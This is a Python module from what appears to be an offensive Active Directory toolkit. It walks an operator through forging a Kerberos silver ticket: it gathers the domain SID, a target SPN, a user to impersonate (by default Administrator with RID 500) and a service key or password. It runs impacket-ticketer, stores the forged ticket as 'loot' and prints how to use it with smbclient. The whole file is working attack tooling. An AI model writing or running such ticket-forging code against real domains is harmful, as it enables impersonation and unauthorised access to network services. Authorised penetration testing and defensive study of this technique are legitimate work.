# modules/kerberos/forge_silver.py

import os
from core.helpers import run_command, save_loot
from core.colors import red, green, yellow, blue
import hashlib

def forge_silver_ticket(session):
    print(blue("[*] Silver Ticket Generator"))

    domain = input(f"[?] Domain (default: {session.domain}): ").strip() or session.domain
    sid = input("[?] Domain SID (e.g., S-1-5-21-...): ").strip()
    if not sid.startswith("S-1-5-21-"):
        print(red("[-] Invalid SID format."))
        return

    impersonate = input("[?] User to impersonate (default: Administrator): ").strip() or "Administrator"
    spn = input("[?] Target SPN (e.g., cifs/target.lab.local): ").strip()
    if "/" not in spn:
        print(red("[-] Invalid SPN format. Use service/hostname."))
        return

    target = input("[?] Hostname of target service (for .ccache name): ").strip()
    if not target:
        print(red("[-] Target hostname required."))
        return

    # === Auth type
    print(blue("[*] Choose authentication method:"))
    print("  1) NT hash")
    print("  2) AES256 key")
    print("  3) Password (will derive RC4 hash)")

    method = input("[?] Method (1/2/3): ").strip()
    if method == "1":
        key_arg = "-nthash"
        key_value = input("[?] Enter NT hash: ").strip()
    elif method == "2":
        key_arg = "-aesKey"
        key_value = input("[?] Enter AES256 key (64 hex chars): ").strip()
    elif method == "3":
        password = input("[?] Enter password: ").strip()
        key_arg = "-nthash"
        key_value = hashlib.new('md4', password.encode('utf-16le')).hexdigest()
        print(green(f"[+] Derived NT hash: {key_value}"))
    else:
        print(red("[-] Invalid method selected."))
        return

    output_file = f"{impersonate}@{spn.replace('/', '_')}.ccache"

    cmd = (
        f"impacket-ticketer {key_arg} {key_value} "
        f"-domain {domain} -domain-sid {sid} "
        f"-user-id 500 -spn {spn} {impersonate}"
    )

    print(blue(f"[*] Forging Silver Ticket as {impersonate} for SPN '{spn}'..."))
    out, err = run_command(cmd)
    print(out)
    if err:
        print(red(err.strip()))

    if os.path.exists(output_file) and os.path.getsize(output_file) > 100:
        with open(output_file, "rb") as f:
            save_loot(output_file, f.read(), binary=True)
        session.krb5_ccache_path = f"loot/{output_file}"
        print(green(f"[+] Silver Ticket saved to loot/{output_file}"))
        print(green(f"[+] Session updated with krb5_ccache_path"))
        print(yellow(f"[i] Use with:\n    export KRB5CCNAME='loot/{output_file}' && smbclient.py -k ..."))
    else:
        print(red("[-] Ticket generation failed or output not created."))
